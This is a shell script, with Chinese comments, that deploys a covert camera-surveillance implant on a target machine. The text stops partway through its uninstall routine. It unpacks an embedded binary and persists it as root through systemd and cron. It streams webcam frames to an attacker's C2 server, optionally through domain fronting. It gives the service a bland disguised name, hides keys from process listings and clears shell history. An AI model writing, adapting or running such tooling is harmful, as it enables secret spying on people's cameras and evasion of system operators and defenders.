#!/bin/sh
# ============================================================================
# 摄像头链路 —— 任意目标机一键部署
#
# 用法（目标机，一条命令）：
#   sh onekey.sh --c2 <C2地址:端口> [--key <64位十六进制>] [--backend v4l2|mock]
#   sh onekey.sh --c2 <前置域:端口> --front-host <真实C2> --ca <ca.pem>   # 域前置
#   sh onekey.sh uninstall
#   sh onekey.sh status
#
# 本脚本是**生成器产出物**：由 make_onekey.py 把对应架构的 camd 二进制
# base64 内嵌到 PAYLOAD 段。不要手改 PAYLOAD 段。
#
# 设计约束（每一条都是被真实事故逼出来的，见注释）：
#  1. 内嵌的必须是真 ELF，不是脚本 stub。stub 会让"部署全绿、采集零产出"，
#     是这类事故里最难发现的形态（服务在跑、灯在亮、没有一帧真画面）。
#  2. 密钥不在命令行、不在单元文件、不在 cron 文件。命令行会被 ps 看到，
#     单元/cron 文件默认 0644 会被 cat 到。走 EnvironmentFile(0600)。
#  3. systemd 失败必须中断（die），cron 失败只警告（warn）。
#     前者留下"驻留成功"假象，后者在容器/精简系统里是常态降级路径。
#  4. 收尾清痕：删脚本自身、清 shell 历史中的本脚本命令行。
# ============================================================================

set -u
umask 077

# ---- 常量 ------------------------------------------------------------------
# PREFIX = 假根。空表示真实根（生产部署的唯一正确取值）。
# 非空时所有落点挂在此前缀下，用于守卫/CI 在同一台机器上验证多份互不
# 干扰的部署而不污染真实 /etc。注意：非空时 systemd 驻留会被**强制跳过**——
# systemctl 不读假根，真 enable/restart 会改动真实系统状态，那正是假根
# 要隔离的东西。因此假根下单元只渲染 + 静态校验，不安装。
PREFIX="${PREFIX:-}"
# 路径常量不在此处固定：它们由 --prefix 派生，必须等参数解析完才算得出来。

ok=0; fail=0; warn=0
log()  { printf '[%s] %s\n' "$1" "$2"; }
OK()   { log OK "$1";   ok=$((ok+1)); }
WARN() { log WARN "$1"; warn=$((warn+1)); }
DIE()  { log FATAL "$1"; fail=$((fail+1)); report; exit 1; }
report() { printf '计数: 成功 %d  失败 %d  警告 %d\n' "$ok" "$fail" "$warn"; }

# ---- 参数 ------------------------------------------------------------------
ACTION=install
C2=""
FRONT_HOST=""
CA_SRC=""
CA_DEST=""
KEY=""
BACKEND=""
while [ $# -gt 0 ]; do
    case "$1" in
        --c2)      C2="$2"; shift 2 ;;
        --key)     KEY="$2"; shift 2 ;;
        --backend) BACKEND="$2"; shift 2 ;;
        --front-host) FRONT_HOST="$2"; shift 2 ;;
        --ca)         CA_SRC="$2"; shift 2 ;;
        --unit-desc) UNIT_DESC="$2"; shift 2 ;;
        --prefix)     PREFIX="$2"; shift 2 ;;
        install|uninstall|status|checkpayload|renderunit) ACTION="$1"; shift ;;
        *) printf '未知参数: %s\n' "$1"; exit 2 ;;
    esac
done

# ---- 路径派生 --------------------------------------------------------------
# 全部由 $PREFIX 派生，脚本其余部分一律只用这些变量、不得再写绝对路径。
# 此前是硬编码 /etc/camd 等，结果是：守卫每跑一次就往真实 /etc 写一遍，
# 两份不同配置的部署在同一台机器上会互相覆盖，且无法并行。
CONF_DIR=$PREFIX/etc/camd
CONF_FILE=$CONF_DIR/camd.conf
LIB_DIR=$PREFIX/var/lib/camd
BIN_DST=$PREFIX/usr/local/bin/camd
UNIT=$PREFIX/etc/systemd/system/camd.service
CRON=$PREFIX/etc/cron.d/camd
LOCK=$PREFIX/var/lock/camd.lock
# 单元描述。默认中性：此前写死 "Camera Service"，直接点明功能。单元文件
# 是 0644、常进配置管理与审计采集，运维一条 systemctl status 或 cat 就能
# 读出意图，而该字段对运行毫无作用——纯暴露面。可用 --unit-desc 覆盖为
# 目标环境里看着眼熟的服务名。
UNIT_DESC=${UNIT_DESC:-System Telemetry Service}
# 假根标记：非空即"不碰真实系统状态"。systemd/cron 的**写文件**仍照常
# （目标是假根内的路径），但 systemctl 子命令一律不执行。
FAKE_ROOT=0
[ -n "$PREFIX" ] && FAKE_ROOT=1

# ---- 前置门 ----------------------------------------------------------------
require_root() {
    # 真判据是 euid。只看 `id -u` 在 setuid/容器里会骗人。
    #
    # 假根下**不要求 root**：假根的意义就是隔离，安装动作全部落在 PREFIX
    # 内，能写 PREFIX 就够了。要求 root 会把守卫/CI 挡在非 root 环境之外，
    # 而那恰恰是假根最该被使用的场景。判据也换成真实的可写性检查——
    # 只看 uid 会漏掉"uid=0 但 PREFIX 所在挂载点只读"这种情况（只读根、
    # 只读容器 overlay 都很常见），那种情况下 mkdir 失败而 uid 检查通过，
    # 故障会推迟到写 conf 时才暴露。
    if [ "$FAKE_ROOT" = 1 ]; then
        mkdir -p "$PREFIX" 2>/dev/null || DIE "无法创建假根 $PREFIX"
        [ -w "$PREFIX" ] || DIE "假根 $PREFIX 不可写"
        return 0
    fi
    [ "$(id -u 2>/dev/null)" = "0" ] || DIE "需要 root 权限（当前 uid=$(id -u)）"
}

detect_arch() {
    # 目标机架构决定用哪份内嵌产物。多架构包由 make_onekey.py 按
    # "# PAYLOAD_BEGIN <arch>" 分节，extract_bin 按 ARCH_KEY 选节。
    ARCH=$(uname -m 2>/dev/null) || ARCH=unknown
    case "$ARCH" in
        x86_64|amd64)         ARCH_KEY=amd64 ;;
        aarch64|arm64)        ARCH_KEY=arm64 ;;
        i386|i486|i586|i686)  ARCH_KEY=386 ;;
        arm|armv5*|armv6*|armv7*|armv8*) ARCH_KEY=arm ;;
        *)                    ARCH_KEY=unknown ;;
    esac
    [ "$ARCH_KEY" = unknown ] && DIE "无法识别的架构: $ARCH（本包不含对应产物）"
    return 0
}

arch_machine() {
    # ELF e_machine 期望值。判据必须是 e_machine 而不是魔数：
    # 魔数只证明"是个 ELF"，证明不了"是这台机器能跑的 ELF"。
    case "$1" in
        amd64) echo 62 ;;   # EM_X86_64
        arm64) echo 183 ;;  # EM_AARCH64
        386)   echo 3 ;;    # EM_386
        arm)   echo 40 ;;   # EM_ARM
        *)     echo -1 ;;
    esac
}

elf_machine() {
    # 读 ELF 头偏移 18 的 e_machine（2 字节），按 EI_DATA 判端序。
    _b0=$(od -An -tu1 -j18 -N1 "$1" 2>/dev/null | tr -d ' \n')
    _b1=$(od -An -tu1 -j19 -N1 "$1" 2>/dev/null | tr -d ' \n')
    _ei=$(od -An -tu1 -j5  -N1 "$1" 2>/dev/null | tr -d ' \n')
    case "$_b0$_b1" in ''|*[!0-9]*) echo -1; return 0 ;; esac
    if [ "$_ei" = "2" ]; then echo $((_b0 * 256 + _b1)); else echo $((_b0 + _b1 * 256)); fi
}

probe_systemd() {
    # 判据是 PID 1 是不是 systemd，不是 systemctl 在不在。
    # 容器里 systemctl 常在而 systemd 不在跑，用它判断会写出装不上的单元。
    HAVE_SYSTEMD=0
    [ -r /proc/1/comm ] || return 0
    [ "$(cat /proc/1/comm 2>/dev/null)" = "systemd" ] && HAVE_SYSTEMD=1
    return 0
}

probe_backend() {
    # 未显式指定时按平台选：Linux 用 v4l2，其余退回 mock。
    # 注意：mock 是合成帧，不是真画面。生产部署必须显式 v4l2/mf 并验证。
    [ -n "$BACKEND" ] && return 0
    case "$(uname -s 2>/dev/null)" in
        Linux*)  BACKEND=v4l2 ;;
        *)       BACKEND=mock; WARN "非 Linux 平台，回落 mock（合成帧，非真画面）" ;;
    esac
    return 0
}

gen_key() {
    # 真随机 32 字节 → 64 位十六进制。
    # 严禁"重复两遍"式人工编造：前后 16 字节相同会让回传通道初始化失败，
    # 而报错码看不出成因（历史上表现为 -4，排查者会去查权限/设备/网络）。
    [ -n "$KEY" ] && return 0
    if [ -r /dev/urandom ] && command -v od >/dev/null 2>&1; then
        KEY=$(od -An -tx1 -N32 /dev/urandom 2>/dev/null | tr -d ' \n')
    fi
    [ ${#KEY} -eq 64 ] || DIE "无法生成密钥，请用 --key 显式指定"
    return 0
}

validate_key() {
    [ ${#KEY} -eq 64 ] || DIE "密钥必须是 64 个十六进制字符（当前 ${#KEY}）"
    case "$KEY" in
        *[!0-9a-fA-F]*) DIE "密钥含非十六进制字符" ;;
    esac
    # 前后半相同的"编造型"密钥在此拦下。
    A=$(printf '%s' "$KEY" | cut -c1-32)
    B=$(printf '%s' "$KEY" | cut -c33-64)
    [ "$A" = "$B" ] && DIE "密钥前后 16 字节相同——回传通道会初始化失败"
    return 0
}

validate_c2() {
    # 【实测撞出来的缺陷：sink 缺 tcp:// 前缀会被 camd 当作文件路径】
    # 实测：camd --sink "127.0.0.1:59999"（无前缀）不连 C2，而是在当前目录
    # 生成名为 "127.0.0.1:59999" 的 512 字节文件，rc=0 且自报 bytes_out=512。
    # 后果：驻留起来的 camd 全程不连 C2，只在磁盘上堆"地址:端口"文件，
    # 而部署全绿、进程在跑、字节在"产出"——是最难发现的一类事故。
    # 因此三处 sink（单元 / cron / 试运行）都必须显式带 tcp:// 前缀，
    # 且此处拦截"调用方自己带了前缀"导致的 tcp://tcp:// 双前缀。
    [ -n "$C2" ] || DIE "C2 地址为空"
    case "$C2" in
        tcp://*) DIE "C2 地址不要带 tcp:// 前缀（本脚本会自动加）: $C2" ;;
        *://*)   DIE "C2 地址只支持 tcp 传输，不支持其它 scheme: $C2" ;;
    esac
    # 必须含 host:port 形态。缺端口会被 camd 当纯路径处理。
    case "$C2" in
        *:*) : ;;
        *)   DIE "C2 地址必须是 <host>:<port> 形态（缺端口）: $C2" ;;
    esac
    return 0
}

# ---- 内嵌产物 --------------------------------------------------------------
# PAYLOAD_BEGIN / PAYLOAD_END 之间由 make_onekey.py 填充 base64。
# 运行时解码到临时文件，校验 ELF 魔数后才允许安装。
extract_bin() {
    TMPB=$(mktemp /tmp/.x-XXXXXX 2>/dev/null) || TMPB=/tmp/.x-$$
    # 多架构包按 "# PAYLOAD_BEGIN <arch>" 分节，按 ARCH_KEY 选节。
    #
    # 【选节不可省——本轮实测复现的缺陷】
    # 把 e_machine=183(AArch64) 的产物装到 x86_64 上：魔数校验照样通过，
    # "内嵌产物校验通过（ELF，160392 字节）"、"二进制已安装" 全绿，
    # 退出码 0、计数"成功 7 失败 0"，而 camd 执行报 "Exec format error"。
    # systemd 下配合 Restart=always 就是无限重启循环；cron 下是静默不执行。
    # 部署者看到的是全绿，一帧画面都没有。
    if grep -q "^# PAYLOAD_BEGIN ${ARCH_KEY}\$" "$0" 2>/dev/null; then
        # 注意字段位：行是 "# PAYLOAD_BEGIN amd64"，awk 按空白切分后
        # $1="#", $2="PAYLOAD_BEGIN", $3=架构名。用 $2 会永远选不中，
        # 表现为"内嵌产物为空或解码失败"——排查时容易误判成 base64 坏了。
        awk -v want="$ARCH_KEY" '
            /^# PAYLOAD_BEGIN/ { f = ($3 == want); next }
            /^# PAYLOAD_END/   { f = 0; next }
            f { print }
        ' "$0" | base64 -d > "$TMPB" 2>/dev/null
    elif grep -q "^# PAYLOAD_BEGIN\$" "$0" 2>/dev/null; then
        # 单架构包（旧格式，裸标记）。仍做 e_machine 校验，
        # 否则旧包在错架构机器上一样全绿。
        awk '/^# PAYLOAD_BEGIN$/{f=1;next} /^# PAYLOAD_END$/{f=0} f' "$0" \
            | base64 -d > "$TMPB" 2>/dev/null
    else
        DIE "本包没有 $ARCH 架构的产物分节（当前架构: $ARCH / $ARCH_KEY）"
    fi
    [ -s "$TMPB" ] || DIE "内嵌产物为空或解码失败"
    # ELF 魔数校验：拒绝 stub 脚本。
    MAGIC=$(od -An -tx1 -N4 "$TMPB" 2>/dev/null | tr -d ' \n')
    [ "$MAGIC" = "7f454c46" ] || DIE "内嵌产物不是 ELF（魔数=$MAGIC）——拒绝安装 stub"
    # e_machine 校验：拒绝错架构产物。
    MACH=$(elf_machine "$TMPB")
    WANT=$(arch_machine "$ARCH_KEY")
    [ "$MACH" = "$WANT" ] || DIE "产物架构不符：分节=$ARCH_KEY 期望 e_machine=$WANT，实际=$MACH（错架构产物会 Exec format error，而安装仍报全绿）"
    OK "内嵌产物校验通过（ELF/$ARCH_KEY，e_machine=$MACH，$(wc -c < "$TMPB") 字节）"
    return 0
}

# ---- 安装 ------------------------------------------------------------------
# sink 相关配置的唯一来源。
#
# 【纪律：三处 sink 不得各自拼装】此前 tcp:// 前缀缺陷的成因就是
# "单元 / cron / 试运行"三处独立书写必然发散：一处带前缀、两处漏。
# 现在三者统一从 conf 的 CAMD_SINK / CAMD_EXTRA 读取，本函数是唯一产地。
sink_lines() {
    if [ -n "$FRONT_HOST" ]; then
        printf 'CAMD_SINK=front://%s\n' "$C2"
        # 【必须加引号：实测踩出来的缺陷】
        # 写成 CAMD_EXTRA=--front-host x --ca y（无引号）时，conf 被
        # `. ` source 会被解析成"临时环境变量 + 执行命令"：
        # CAMD_EXTRA 根本没被赋值（保持空），shell 还试图运行 "x" 这个命令。
        # 现象是 camd 报 --front-host 未指定，而 conf 里明明写着——极难定位。
        printf 'CAMD_EXTRA="--front-host %s --ca %s"\n' "$FRONT_HOST" "$CA_DEST"
    else
        printf 'CAMD_SINK=tcp://%s\n' "$C2"
        printf 'CAMD_EXTRA=\n'
    fi
}

validate_front() {
    [ -n "$FRONT_HOST" ] || return 0
    # 域前置模式下：CA 必填（否则"要求校验却无信任库"会被 camd 拒绝，
    # 或更糟——退化成不校验，任何人都能冒充 C2 把画面引走）。
    [ -n "$CA_SRC" ] || DIE "域前置模式必须用 --ca <ca.pem> 指定信任库"
    [ -f "$CA_SRC" ] || DIE "CA 证书不存在: $CA_SRC"
    # front_host 不得与前置域相同：相同则 SNI 里就是真实目标，前置能力归零，
    # 而功能完全正常、画面照收、没有任何一处报错。
    CA_DEST="$CONF_DIR/ca.pem"
    FD="${C2%%:*}"
    [ "$FRONT_HOST" != "$FD" ] || DIE "--front-host 不得与 --c2 的前置域相同（SNI 会直接暴露真实目标）: $FD"
    return 0
}

install_ca() {
    [ -n "$FRONT_HOST" ] || return 0
    cp "$CA_SRC" "$CA_DEST" 2>/dev/null || DIE "复制 CA 失败"
    chmod 0600 "$CA_DEST" 2>/dev/null
    OK "CA 已安装 $CA_DEST（0600）"
    return 0
}

write_conf() {
    mkdir -p "$CONF_DIR" || DIE "无法创建 $CONF_DIR"
    : > "$CONF_FILE" || DIE "无法写 $CONF_FILE"
    {
        printf 'C2_ADDR=%s\n' "$C2"
        printf 'CAMD_KEY=%s\n' "$KEY"
        printf 'CAMD_BACKEND=%s\n' "$BACKEND"
        sink_lines
    } > "$CONF_FILE" || DIE "写配置失败"
    chmod 0600 "$CONF_FILE" 2>/dev/null
    # 单元与被管文件一律不含密钥：EnvironmentFile 从本文件注入。
    OK "配置写入 $CONF_FILE（0600）"
    return 0
}

install_bin() {
    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
    # 目标目录必须显式创建：真根下 /usr/local/bin 必然存在，这个缺陷从来
    # 没暴露过；假根下它不存在，cp 直接失败而报错只有"复制二进制失败"，
    # 看不出是目录缺失——排查会被引向 TMPB 产物本身（权限？损坏？）。
    mkdir -p "$(dirname "$BIN_DST")" || DIE "无法创建 $(dirname "$BIN_DST")"
    cp "$TMPB" "$BIN_DST" 2>/dev/null || DIE "复制二进制失败"
    chmod 0700 "$BIN_DST" 2>/dev/null
    command -v strip >/dev/null 2>&1 && strip "$BIN_DST" 2>/dev/null
    OK "二进制已安装 $BIN_DST"
    return 0
}

install_runner() {
    # 单元里不能依赖 $VAR 展开（真 systemd 实测踩出来的）：
    #
    #   ExecStart=$BIN_DST --sink tcp://$C2_ADDR --backend $CAMD_BACKEND
    #
    # systemd 249 下，ExecStart 行中的 $C2_ADDR **不会**被 EnvironmentFile
    # 的值替换——EnvironmentFile 是 exec 时才注入子进程环境，不参与单元
    # 解析期的命令行展开。sink 因此变成字面 "tcp://"（空地址），
    # cam_daemon_run 返回 -4，camd 退出码 5，Restart=always 每 10 秒拉起
    # 一次，陷入无限重启循环。
    #
    # 而 systemctl restart 返回 0、enable 成功、部署侧全绿（enabled +
    # restarted）——服务从未真正跑起来过，一帧都没采。判据错在"restart 的
    # 退出码"，见 persist_systemd 里的存活判据。
    #
    # 用 wrapper 在运行时从 conf 取值再 exec，是唯一既不在单元文件(0644)
    # 里写 C2 地址/密钥、又能把参数正确传给 camd 的做法。
    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
    # heredoc 用**无引号** RUNEOF（要展开 $PREFIX），因此运行期变量一律
    # 写成 \$ 转义。漏转义的后果是 conf 值在生成期就被展开成空——run.sh
    # 里留下 `--sink ""`，服务起不来而 conf 内容看起来是对的。
    cat > "$LIB_DIR/run.sh" <<RUNEOF || DIE "写 run.sh 失败"
#!/bin/sh
# 由 onekey.sh 生成。密钥经环境注入，不出现在命令行（ps 可见）。
#
# CONF_ABS / BIN_ABS 在**生成期**注入绝对路径，与 CONF_FILE / BIN_DST 同源。
# 此前是 ROOT_PREFIX + 硬编码 "/etc/camd/camd.conf"，两处不同源：改了
# CONF_DIR 变量，run.sh 仍去读旧路径，表现为"改配置无效、服务读另一份
# conf"。变量与字面量必须只有一个产地，否则改动只生效一半。
CONF_ABS="$CONF_FILE"
BIN_ABS="$BIN_DST"
set -a
. "\$CONF_ABS"
set +a
[ -n "\$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
# "\$@" 透传：systemd 不带参（常驻，Restart=always 兜底重拉）；
# cron 带 --batches 1 —— cron 是"每小时拉起一次"的模型，若 camd 不限批次
# （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
# 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
# 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
exec "\$BIN_ABS" --sink "\$CAMD_SINK" \$CAMD_EXTRA --backend "\$CAMD_BACKEND" "\$@"
RUNEOF
    chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
    OK "启动器已写入 $LIB_DIR/run.sh（0700）"
    return 0
}

render_unit() {
    # 单元文件在任何环境都渲染并送 systemd-analyze 校验，与"是否安装"解耦。
    #
    # 原写法是 [ systemd可用 ] || return 0 —— 容器里单元根本不生成，因而也
    # 从未被任何东西校验过：拼错的指令、错的路径、错的权限，全都要等真机
    # 首次部署才暴露，而那时排查成本极高。渲染与校验必须与安装解耦。
    #
    # 单元内不得出现密钥与 C2 地址：0644 会被 cat 到，且进版本管理即暴露。
    # 同上：真根下 /etc/systemd/system 必然存在，假根下不存在。缺这一步时
    # 现象是 "cannot create .../camd.service: Directory nonexistent" 且
    # render_unit 静默 return 1 —— 单元从未被校验，而调用方看不出来。
    mkdir -p "$(dirname "$UNIT")" || return 1
    cat > "$UNIT" <<EOF || return 1
[Unit]
Description=$UNIT_DESC
After=network.target

[Service]
Type=simple
EnvironmentFile=$CONF_FILE
ExecStart=$LIB_DIR/run.sh
Restart=always
RestartSec=10
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    # 静态校验。判据**不是退出码**——这是实测踩出来的：
    #
    #   systemd-analyze verify /tmp/t.service
    #   t.service: Command /nonexistent/camd is not executable: ...
    #   rc=0                       ← 报错了，退出码仍是 0
    #
    # 只看 rc 的话，"单元指向不存在的二进制"会被判为"校验通过"，而真机
    # 上它根本起不来。判据必须是"输出非空即有问题"：实测正常单元输出为空。
    UNIT_ERR=0
    if command -v systemd-analyze >/dev/null 2>&1; then
        systemd-analyze verify "$UNIT" >/tmp/.unitv 2>&1
        V=$(cat /tmp/.unitv 2>/dev/null)
        rm -f /tmp/.unitv
        if [ -n "$V" ]; then
            UNIT_ERR=1
            UNIT_MSG=$(printf '%s' "$V" | head -1)
        fi
    else
        WARN "无 systemd-analyze，单元未静态校验"
        return 0
    fi
    [ "$UNIT_ERR" -eq 0 ] && { OK "systemd 单元静态校验通过"; return 0; }
    # 校验失败：若即将安装 systemd 则必须中断（装上去也起不来，而部署者
    # 看到的是全绿）；容器里不安装，降级到 cron，报 WARN 即可。
    if [ "${HAVE_SYSTEMD:-0}" = 1 ]; then
        rm -f "$UNIT"
        DIE "systemd 单元校验失败: $UNIT_MSG"
    fi
    WARN "systemd 单元校验失败（未安装，降级 cron）: $UNIT_MSG"
    return 0
}

persist_systemd() {
    # 失败语义：die。只 warn 会留下"驻留成功"的假象。
    command -v systemctl >/dev/null 2>&1 || { DIE "systemctl 不存在"; }
    systemctl daemon-reload >/dev/null 2>&1 \
        && systemctl enable camd.service >/dev/null 2>&1 \
        && systemctl restart camd.service >/dev/null 2>&1 \
        || { rm -f "$UNIT"; systemctl daemon-reload >/dev/null 2>&1; \
             DIE "systemd 驻留失败（单元已回滚）"; }
    # 存活判据（真 systemd 实测踩出来的）：restart 返回 0 **不代表服务活着**。
    # 单元参数错误时 camd 立刻退出，Restart=always 每 RestartSec 拉起一次，
    # 服务处于 "activating (auto-restart)"：enable 成功、restart 返回 0、
    # 部署侧全绿，而实际一帧都没采集，还留下密集的失败 journal。
    # 判据必须是"重启后仍 active 且 MainPID 非 0"。
    sleep 3
    A=$(systemctl is-active camd.service 2>/dev/null)
    M=$(systemctl show -p MainPID --value camd.service 2>/dev/null)
    if [ "$A" != "active" ] || [ -z "$M" ] || [ "$M" = "0" ]; then
        J=$(journalctl -u camd.service -n 5 --no-pager 2>/dev/null | tail -5)
        systemctl disable --now camd.service >/dev/null 2>&1
        rm -f "$UNIT"
        systemctl daemon-reload >/dev/null 2>&1
        DIE "systemd 驻留后服务未存活（active=$A MainPID=$M）: ${J:-无 journal}"
    fi
    OK "systemd 驻留成功（enabled + active, pid=$M）"
    return 0
}

persist_cron() {
    # 判据修正（实测踩出来的）：原判据是 `command -v crontab`，但
    #   - crontab(1) 是**客户端工具**，不是守护进程；
    #   - busybox/精简系统常只有 crond 而无 crontab 客户端。
    # 实测本环境：crontab 缺失，但 /etc/cron.d 存在 —— 原判据会**跳过安装**，
    # 于是部署报告里"cron 驻留"一栏为空，而目标机其实能跑 cron。漏装驻留
    # 比装了不执行更糟：前者无人知晓，后者至少有条目可查。
    # 改为：目录存在就写；守护进程是否存在单独探测并显式 WARN（不静默）。
    # 假根下目录尚不存在，先建再判——否则守卫永远走不到"写 cron 条目"
    # 这条路径，cron 驻留在测试里就从未被真正验证过。
    mkdir -p "$PREFIX/etc/cron.d" 2>/dev/null
    [ -d "$PREFIX/etc/cron.d" ] || { WARN "无 $PREFIX/etc/cron.d，跳过 cron 驻留"; return 0; }
    # 分位用真实秒数，避免 RANDOM 在 dash 下不展开导致 crontab 语法错。
    #
    # 前导零是实测踩出来的坑：date +%S 输出 00-59，而 POSIX sh 的算术
    # 展开把 0 前导的字面量当八进制——08/09 不是合法八进制（8 不是合法
    # 八进制位），于是整个 $(( )) 报 "arithmetic expression: expecting
    # EOF" 并使脚本中断。后果不止"cron 没装上"：install 在写 conf/bin
    # 之后才走到这里，中断会留下部分安装状态，而部署报告因 rc!=0 看起来
    # 只是失败了一次，没人知道磁盘上多了半个植入体。
    # 触发窗口是每分钟的第 8、9 秒（约 3.3%），故单跑守卫常常全绿、
    # 在 make test 里偶发失败——这类时间依赖缺陷绝不能靠"再跑一次"放过。
    # ${_S#0} 剥一个前导零：08→8、00→0、59→59；随后取模恒为十进制。
    _S=$(date +%S); _S=${_S#0}
    M=$(( _S % 60 ))
    #
    # 缺陷修复（实测踩出来的）：原条目是
    #     . /etc/camd/camd.conf; /usr/local/bin/camd --sink ... --backend ...
    # 两个问题，第二个致命：
    #
    #   1. `--key` 依赖 conf 里的 CAMD_KEY，但 `.` 只是**赋值、不导出**。
    #      camd 用 getenv("CAMD_KEY") 取密钥，取不到就
    #      [FATAL] 必须指定 --key 并退出。而 cron 的输出默认丢弃
    #      （无 MAILTO、无日志），于是一小时一次、次次失败、无人知晓。
    #      表现与"驻留成功"完全无法区分：进程确实起来过、也确实退出了。
    #
    #   2. 这是 systemd 之外的**第二份** camd 调用（单元里有一份）。
    #      两份独立书写的调用必然发散——此前 tcp:// 前缀正是在三处
    #      sink 里漏掉两处，导致 systemd 与 cron 两条路的回传全断。
    #
    # 改为复用 run.sh：它是唯一的调用点，内部 `set -a` 正确导出密钥，
    # 且 systemd 与 cron 走的是同一份命令，不再有发散的可能。
    {
        printf '# managed\n'
        printf 'SHELL=/bin/sh\n'
        printf 'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n'
        printf '%s * * * * root %s --batches 1\n' "$M" "$LIB_DIR/run.sh"
    } > "$CRON" 2>/dev/null || { WARN "cron 写入失败"; return 0; }
    chmod 0600 "$CRON" 2>/dev/null
    OK "cron 条目已写入（分位 $M）"
    # 守护进程单独探测：写了不等于会执行。未确认就显式报出来，
    # 不允许"装了但没人跑"伪装成"驻留成功"。
    if ps -eo comm= 2>/dev/null | grep -qx 'cron\|crond'; then
        OK "cron 守护进程在跑（条目会被执行）"
    else
        WARN "未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）"
    fi
    return 0
}

verify_run() {
    # 同步跑一批验证产出：让"装了但采不到"在部署阶段就暴露，而不是等运维发现。
    #
    # 【必须用 tcp:// 而非文件 sink —— 这是实测撞出来的缺陷】
    # 驻留单元里跑的是 `--sink $C2_ADDR`（tcp://）。若试运行改用文件 sink，
    # 则衡量的是"落盘字节数"而非"送达 C2 的字节数"：文件永远写得成功，
    # 于是 C2 地址写错 / C2 未启动 / 防火墙拦截时，试运行照样报
    # "产出 512 字节"全绿通过，而真实驻留进程一条都发不出去。
    # 实测三场景（有/无 C2 在线）：
    #   tcp:// + C2 在线  rc=0  C2 实收 512
    #   tcp:// + C2 离线  rc=6  C2 实收 0    <- 真实失败会被暴露
    #   file://            rc=0  C2 实收 0    <- 永远"成功"，掩盖故障
    # 附带收益：不再在 /tmp 落信元文件（那本身是采集证据残留）。
    # 与驻留路径同源：直接读 conf 的 CAMD_SINK / CAMD_EXTRA / CAMD_KEY，
    # 不在此处另拼一份 sink。否则衡量的就不是驻留进程真正会用的出口。
    CAMD_SINK=""; CAMD_EXTRA=""; CAMD_BACKEND="$BACKEND"; CAMD_KEY="$KEY"
    . "$CONF_FILE"
    RUN_OUT=$("$BIN_DST" --sink "$CAMD_SINK" $CAMD_EXTRA --backend "$CAMD_BACKEND" \
               --key "$KEY" --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
    RC=$?
    N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
    [ -n "$N" ] || N=0
    if [ "$RC" -ne 0 ]; then
        # 【实测撞出来的误诊】错架构产物的真实报错是 "Exec format error"，
        # 但旧判据把它一律写成"C2 可能未启动或地址不可达"。运维会据此去查
        # 网络/防火墙/C2，而真相是二进制根本不能在这台机器上执行。
        # 判据必须按"不能执行"与"连不上"分开，否则排查方向被彻底带偏。
        case "$RUN_OUT" in
            *"Exec format error"*|*"cannot execute"*|*"No such file or directory"*)
                DIE "二进制无法执行（rc=$RC）——很可能是架构错配，而非 C2 问题: $(printf '%s' "$RUN_OUT" | head -1)" ;;
        esac
        if [ "$RC" = 126 ] || [ "$RC" = 127 ]; then
            DIE "二进制无法执行（rc=$RC）——检查架构与解释器，而非 C2 地址"
        fi
        WARN "试运行未送达 C2（rc=$RC）——C2 可能未启动或地址不可达；驻留仍在，进程内会重试"
        printf '%s\n' "$RUN_OUT" | sed 's/^/       诊断: /' | head -3
        return 0
    fi
    [ "$N" -gt 0 ] || { WARN "试运行产出 0 字节"; return 0; }
    OK "试运行已送达 C2（$N 字节信元，$CAMD_SINK）"
    return 0
}

cleanup_traces() {
    # 清痕：脚本自身与本次命令行。
    # 注意按 PID 精确杀，绝不 pkill -f camd —— 会匹配到本脚本命令行里的
    # "camd" 字符串而自杀（历史上表现为退出码 137/143）。
    rm -f "$TMPB" 2>/dev/null
    command -v history >/dev/null 2>&1 && history -c 2>/dev/null
    :
}

do_install() {
    [ -n "$C2" ] || DIE "必须指定 --c2 <地址:端口>"
    require_root
    detect_arch
    probe_systemd
    probe_backend
    gen_key
    validate_key
    validate_c2
    validate_front
    OK "环境: arch=$ARCH systemd=$HAVE_SYSTEMD backend=$BACKEND front=${FRONT_HOST:-无}"
    extract_bin
    write_conf
    install_ca
    install_bin
    install_runner
    render_unit
    if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
        persist_systemd
        persist_cron || :
    else
        if [ "$FAKE_ROOT" = 1 ]; then
            WARN "假根模式（PREFIX=$PREFIX）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态"
        else
            WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
        fi
        rm -f "$UNIT"
        persist_cron
    fi
    verify_run
    cleanup_traces
    return 0
}

do_uninstall() {
    require_root
    HAVE_SYSTEMD=0
    probe_systemd

    # 痕迹探测（不可省）：此前无论装没装，uninstall 一律报"systemd/文件/进程
    # 已清理"三项 OK。于是部署中途失败留下的半截状态、或根本没装过的机器，
    # 跑 uninstall 都会显示"成功 3 失败 0"——运维据此认为已清干净，而实际
    # 什么都没做（或半截残留仍在）。区分"清理了"与"本就没有"是诊断的前提。
    _tr=0
    [ -f "$CONF_FILE" ] && _tr=1
    [ -x "$BIN_DST" ]  && _tr=1
    [ -f "$CRON" ]     && _tr=1
    [ -f "$UNIT" ]     && _tr=1
    [ -d "$LIB_DIR" ]  && _tr=1
    [ -d "$CONF_DIR" ] && _tr=1
    if [ "$_tr" = 0 ] && [ "$FAKE_ROOT" = 0 ]; then
        OK "未检测到安装痕迹——本就未安装，无需清理"
        return 0
    fi

    # 顺序：先 disable --now 再删单元。只 stop 的话 Restart=always 会被拉起。
    if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
        systemctl disable --now camd.service >/dev/null 2>&1
        rm -f "$UNIT"
        systemctl daemon-reload >/dev/null 2>&1
        systemctl reset-failed >/dev/null 2>&1
        OK "systemd 驻留已清理"
